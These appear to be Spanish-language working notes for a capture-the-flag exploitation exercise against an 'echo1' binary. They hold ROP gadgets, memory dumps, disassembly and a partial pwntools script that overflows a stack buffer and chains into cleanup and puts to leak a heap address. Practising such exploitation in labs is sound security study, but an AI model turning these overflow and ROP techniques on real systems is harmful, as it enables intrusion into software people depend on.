#! /usr/bin/env python3
# -*- coding: utf-8 -*-

bof ->  'A'*32 + rbp + ret addr

el binario se carga en una direccion fija

yo se donde esta un punto a mi nombre, quiza puedo hacer algo con eso?? rop rop rop print ret



0x00000000004006ec : call rax
0x0000000000400deb : call rdi
0x0000000000400835 : call rdx

0x0000000000400b10 : mov edi, dword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret


0x0000000000400aea : call qword ptr [rsp + rbx*8]

rbx -> 0x20


0x012e4260  4142 4344 4546 4748 4949 4900 0000 0000  ABCDEFGHIII.....
0x012e4270  40e7 2b65 fc7f 0000 c007 4000 0000 0000  @.+e......@.....
0x012e4280  ec07 4000 0000 0000 1104 0000 0000 0000  ..@.............
0x012e4290  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0x012e42a0  4141 4141 4141 4141 4141 4141 4141 0a00  AAAAAAAAAAAAAA..

nombre -> ABCDEF...
echo1  -> AAAAAA...

0x00602098 -> puntero al heap -> nombre

addr del nombre + 48 -> echo1

heap ejecutable!
averiguar addr del heap y saltar a shellcode en echo1 input?



0x0000000000400762 : pop rbp ; ret
0x004007f8 -> goodbye?

saltar a:
            0x004007f8      b88a0b4000     mov eax, str.goodbye__s     ; 0x400b8a ; "goodbye %s\n"
            0x004007fd      488b55f8       mov rdx, qword [rbp - 8]    ; puntero a los datos, osea 0x00602098
            0x00400801      4889d6         mov rsi, rdx
            0x00400804      4889c7         mov rdi, rax
            0x00400807      b800000000     mov eax, 0
            0x0040080c      e82ffeffff     call sym.imp.printf         ;[1]
            0x00400811      b800000000     mov eax, 0
            0x00400816      c9             leave

rbp tiene que ser un address enserio
de esta manera se puede leakear una direccion de memoria

**********************
X = direccion de mem contigua a una direc que almacena 0x00602098 
    ...
    rbp = X
    ret = 0x004007f8
    [que pasa con el leave antes de el ret??] -> mov rsp, rbp, pop rbp -> arruina el stack frame?
    ret = ?


**********************

yo deberia dejar en el BOF la direccion de memoria que me interesa -> 0x00602098
deberia hacer que rbp sea la direccion de memoria donde escribiaAAAAAAAAAAAA
no se donde lo escribi porque es en el stack y no se donde esta...

*********************



|   sym.cleanup ();                                                                                                                                   
|           ; CALL XREF from sym.main (0x400a20)                                                                                                      
|           0x0040089c      55             push rbp                                                                                             
|           0x0040089d      4889e5         mov rbp, rsp                                                                                         
|           0x004008a0      488b05f11720.  mov rax, qword obj.o        ; [0x602098:8]=0x941260 ; "`\x12\x94"                                   
|           0x004008a7      4889c7         mov rdi, rax                                                                                         
|           0x004008aa      e871fdffff     call sym.imp.free           ;[1] ; void free(void *ptr)                                              
|           0x004008af      5d             pop rbp                                                                                           
\           0x004008b0      c3             ret 



|           0x00400890      e89bfdffff     call sym.imp.puts           ;[1] ; int puts(const char *s)
|           0x00400895      b800000000     mov eax, 0
|           0x0040089a      5d             pop rbp
\           0x0040089b      c3             ret


si llamo a cleanup, rdi es obj.o,
dsp llamo a puts y leakeo el address de el heap


y no hay leaves !!

from pwn import *
p = process('./echo1')
p.recvuntil('name? : ')
p.sendline('user')
p.recvuntil('> ')
p.sendline('1')
p.recvuntil('user\n')
payload  = b'A'*32
payload += b'B'*8 # rbp
payload += p64(0x004008a0) # inside cleanup
payload += b'B'*8 # rbp again
payload += p64(0x00400890) # puts
payload += b'B'*8 # rbp again
p.sendline(payload)
leak = p.recvline()
leak = u64(leak[-4:] + b'\x00'*4)

free me sobreescribe el address que necesito... LPM!

*************************


